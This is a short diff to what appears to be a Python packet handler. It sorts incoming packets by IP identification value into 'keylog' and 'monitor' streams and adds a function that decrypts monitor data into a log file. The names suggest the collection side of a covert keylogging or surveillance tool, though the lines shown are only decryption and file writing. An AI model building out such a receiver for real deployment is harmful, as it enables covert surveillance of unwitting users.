@@ -90,6 +90,14 @@ def subprocess_packet_handler(pkt):
     if pkt[IP].id == MONITOR_IDENTIFICATION:
         write_monitor_data(encrypted_message)
 
+def write_keylog_data(data):
+    pass
+
+def write_monitor_data(data):
+    b = BLOCK_ENCRYPTION_HANDLER.decrypt(data)
+    msg = b.decode("utf-8")
+    with open("logs/monitor.log", "w") as f:
+        f.write(msg + "\n")
 
 def subprocess_start():
     """
